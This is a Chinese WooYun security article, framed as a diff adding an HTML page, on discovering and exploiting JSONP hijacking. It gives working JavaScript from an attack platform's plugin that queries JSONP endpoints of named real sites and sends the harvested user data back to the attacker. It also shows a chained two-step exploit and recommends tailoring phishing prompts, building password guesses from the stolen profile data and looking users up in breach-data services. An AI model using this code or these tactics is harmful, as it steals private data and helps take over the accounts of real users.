@@ -1,0 +1,68 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">JSONP挖掘与高级利用</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">蚁逅</a> <span class="bull">·</span> <time title="2015/06/18 15:51" ui-time="" datetime="2015/06/18 15:51" class="published ng-binding ng-isolate-scope">2015/06/18 15:51</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p><strong>本文仅提供给爱好者学习交流，切勿用于其他<code>非法用途</code></strong></p><h1>0x00 参考资料</h1><hr><ol><li><a href="http://drops.wooyun.org/papers/6612">利用JSONP进行水坑攻击 - 乌云知识库</a></li><li><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/">JSONP 安全攻防技术 - 知道创宇</a></li></ol><h1>0x01 漏洞之我见</h1><hr><blockquote><p>这里不多说JSONP的介绍等，大家都懂。</p></blockquote><p>这里，我站在程序员的角度去解释JSONP的正常使用。<br>首先，定义一个用于接收数据的回调函数，比如：</p><pre><code>function myData(data) {
+    console.log('[!] DATA: ', data);
+}
+</code></pre><p>然后呢，我们就采用<code>&lt;script&gt;</code>标签去跨域获取数据：</p><pre><code>&lt;script src="http://root.cool/userinfo?fn=myData"&gt;&lt;/script&gt;
+</code></pre><p>当获取完如上url的内容后，会自动解释成<code>js</code>代码执行。由此来看，以上url访问输出的结果类似如下：</p><pre><code>myData([{nickname: 'ANT', weibo: 'http://weibo.com/antoor'}])
+</code></pre><p>其实就是执行了我们刚刚定义的<code>myData</code>函数并把需要的数据当作参数传入了进去而已。<br>这样，我们就能理所当然地在<code>myData</code>函数中就获取到了我们所需要的数据。</p><p><strong>然后，我们站在攻击者的角度去想，如何最大化利用这个给程序员带来的方便的同时所带来的<code>安全隐患</code>？</strong></p><h1>0x02 测试与构思</h1><hr><p>这个漏洞和<code>xss</code>结合是非常完美的一种攻击手段，而这个功能，在蚁逅平台中的<code>蚁弹超人</code>早已经很容易地得到实现。 我们还是和程序员一样，先定义一个用来接收数据的函数，然后把我们挖掘到的<code>JSONP</code>接口进行逐个测试获取信息并返回，这样，就达到了我们获取目标信息的手段。<br>用蚁弹超人中的<code>JSONP探测</code>插件的服务端代码来解释（已经去掉一些不好的接口）：</p><pre><code>#!javascript
+(function(API, AUTOSTART) {
+    var JSONP = {
+        hooks: [{
+            name: '人人网1',
+            link: 'http://base.yx.renren.com/RestAPI?method=api.base.getLoginUser&amp;format=2&amp;callback='
+        }, {
+            name: '人人网2',
+            link: 'http://passport.game.renren.com/user/info?callback='
+        }, {
+            name: '网易163',
+            link: 'http://comment.money.163.com/reply/check.jsp?time=1367240961474&amp;callback='
+        }, {
+            name: '天涯论坛1',
+            link: 'http://passport.tianya.cn/online/checkuseronline.jsp?callback='
+        }, {
+            name: '当当网',
+            link: 'http://message.dangdang.com/api/msg_detail.php?customer_id=o4P00TweebicwjhS72NWew%3D%3D&amp;data_type=jsonp&amp;pageindex=1&amp;module=1&amp;pagesize=10&amp;_=1416721945308&amp;callback='
+        }],
+        start: function() {
+            var self = this,
+                inter = setInterval(function() {
+                    if (!self.hooks[0]) {
+                        clearInterval(inter);
+                        return self.end();
+                    }
+                    self.get(self.hooks[0].link, self.hooks[0].name);
+                    self.hooks.shift();
+                }, 1000);
+        },
+        get: function(link, name, fn) {
+            var hash = 'bomb' + String(new Date().getTime());
+            window[hash] = function(data) {
+                var _data = typeof(data) === 'object' ? JSON.stringify(data) : String(data);
+                API.ss('### ' + name + '\n```\n' + _data + '\n```\n');
+            };
+            API.loadJS(link + hash);
+        },
+        end: function() {
+            API.send('end');
+        }
+    };
+    API.listen(function(act) {
+        if (act === 'start') {
+            JSONP.start();
+        }
+    });
+    AUTOSTART ? JSONP.start() : null;
+})
+</code></pre><p>这段代码是很容易理解的，我们首先定义一个<code>JSONP接口</code>列表，然后通过<code>start</code>方法进行逐个接口的访问以及数据获取，最后直接进行数据返回以及保存，就这么简单。</p><h1>0x03 漏洞挖掘</h1><hr><p>一个好的工具是需要很多资源的支撑。</p><p>说了这么多，那我们如何去挖掘<code>JSONP接口</code>呢？</p><h3>1. 手动挖掘</h3><p>手动挖掘有利于深入学习原理以及发挥更多的不可能。</p><p>这里我采用<code>chrome浏览器</code>的调试窗口进行挖掘<code>weibo.com</code>中存在的漏洞。</p><p>首先把<code>Preserve log</code>选项勾上，这样用来防止页面刷新跳转的时候访问记录被重置，也方便我们进行下一步的筛选。</p><p><img alt="" img-src="12cef659ed622d2fa593584fe968280b7f78eb36.jpg"></p><p>然后，我们就可以在地址栏输入<code>weibo.com</code>，进行登录，然后在页面中随便点击链接了，这样做是为了收集更多的URL，你懂的！</p><p>感觉差不多了的时候，我们<code>Ctrl+F</code>进行搜索筛选，搜索关键字是一个绝活，你可以站在程序员的角度去想，写这个接口的规范一般是在服务端接收<code>callback</code>参数。<br>所以我们可以搜索<code>callback</code>关键字：</p><p><img alt="" img-src="d49d40f05c72233b688a03375101fb718c15d6ed.jpg"></p><p>站在攻击者的角度去想，还可以搜索<code>.json</code>关键字，或者其他你觉得可能出现问题的任何字符：</p><p><img alt="" img-src="dd6accef87af3619747b027b2ebf11acdb05740b.jpg"></p><h3>2. 搜索挖掘</h3><p>上面的挖掘方法有点蠢，不过也是获取最准确以及最新数据的最有效方法。如果你是个懒人，那么搜索挖掘可能更适合。</p><p>根据上面的关键字，我们直接带入搜索引擎：</p><p><img alt="" img-src="bcb0c10864ac2bb1d8a2ecec978a08fbd391f340.jpg"></p><h3>3. 工具挖掘</h3><blockquote><p>如果搜索引擎无法提供最新的数据，你又不想手动一个个傻乎乎地去挖掘，那么，用你熟悉的脚本快速的编写一个工具也是极好的。</p></blockquote><p>这里就不多说如何编写了，只提供一下思路：</p><ol><li>用脚本爬取目标站点收集<code>url</code>以及<code>headers</code>等信息</li><li>通过<code>url</code>中是否存在<code>callback</code>等关键字以及<code>headers</code>中的<code>Content-Type</code>进行模糊过滤</li><li>对模糊判断过滤的结果内容进行更准确地判断，比如判断内容中是否含有<code>callback</code>参数关键字以及模拟沙盒执行等等</li></ol><h1>0x04 漏洞高级利用</h1><hr><p><strong>那么，你觉得<code>JSONP</code>仅仅是用来获取用户信息的吗？</strong></p><h3>1. 定位钓鱼</h3><blockquote><p>通过<code>JSONP</code>获取的数据来判断当前个人的信息，如邮箱、博客、微博等再进行针对性地钓鱼。</p></blockquote><p>这样，你可以利用获取到的信息降低被攻击者的防范意识。<br>比如你弹框<code>请输入您的登录密码</code>可能会让用户产生怀疑，但是你要是这么写：<code>亲爱的YD，请输入您的登录密码</code>，那成功率会不会更大了呢？</p><h3>2. 二次结合</h3><p>在对一个购物网站进行挖掘的过程中，发现有的接口必须先知道用户的信息才能进一步获取我们需要的数据，那么，就得采用二次结合的方法来进行利用了。<br>假设，我们挖掘到了两个<code>jsonp</code>接口：</p><pre><code>1. http://root.cool/userinfo?callback=test
+2. http://root.cool/usercoin?nickname=ANT&amp;callback=xxxx
+</code></pre><p>而我们要获取的是第二个接口的数据，但是第二个接口必须知道<code>nickname</code>参数，而<code>nickname</code>参数可以在第一个接口中获取，那好办：</p><pre><code>#!javascript
+function fn1(data) {
+    API.loadJS('http://root.cool/usercoin?nickname=' + data.nickname + '&amp;callback=fn2');
+}
+function fn2(data) {
+    console.log('[!] 用户余额为：', data);
+}
+API.loadJS('http://root.cool/userinfo?callback=fn1');
+</code></pre><p>很好理解吧！</p><h3>3. 密码猜解攻击</h3><p>这个比较好玩，假设我们需要利用xss攻破目标的路由，但是弱口令尝试失败，那么，我们就可以通过获取到的<code>JSONP</code>数据信息进行密码的组合、搜索。<br>比如获取到微博<code>antoor</code>，那可以组合出<code>antoor123</code>、<code>antoor123456</code>等密码，也可以通过获取到的邮箱、QQ等进行在线"数据泄漏查询"接口进行密码查询返回，然后下一步你懂的！</p><p>这里说一下数据泄漏查询，也就是"社工库"的接口设计，我们要进行跨域查询，可以选择<code>JSONP</code>的方式，也可以通过设置<code>headers</code>中的<code>Access-Control-Allow-Origin</code>为<code>*</code>进行跨域允许。</p><p>给个PHP代码例子（摘自蚁逅<code>PHP运行环境</code>脚本）：</p><pre><code>#!php
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Headers: X-Requested-With,X_Requested_With');
+</code></pre><h1>0x05 后记杂语</h1><hr><p>最近看到关于<code>JSONP</code>攻击的方法又火了起来，趁着兴头把自己的一点见解分享给大家。<br>有不好，请指导，有技巧，欢迎探讨！</p><blockquote><p>联系我：微博@<a href="http://weibo.com/antoor">蚁逅</a></p></blockquote><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/660" rel="bookmark" id="re1">php4fun.sinaapp.com PHP挑战通关攻略</a></li><li><a href="http://drops.wooyun.org/papers/4386" rel="bookmark" id="re2">One git command may cause you hacked(CVE-2014-9390)</a></li><li><a href="http://drops.wooyun.org/papers/42" rel="bookmark" id="re3">Json hijacking/Json劫持漏洞</a></li><li><a href="http://drops.wooyun.org/papers/382" rel="bookmark" id="re4">闲扯下午引爆乌云社区“盗窃”乌云币事件</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">LoveSnow</span> <span class="reply-time">2016-01-27 14:15:59</span></div><p></p><p>写得不错</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0x334</span> <span class="reply-time">2015-06-25 10:19:06</span></div><p></p><p>写的不错，有所得</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">EtherDream</span> <span class="reply-time">2015-06-19 13:38:22</span></div><p></p><p>最简单的挖法：捕获带 callback= 的 url，把 referer 换成其他站点重放一次，还是成功那就对了。</p><p></p></div></div></div></div></div></main>
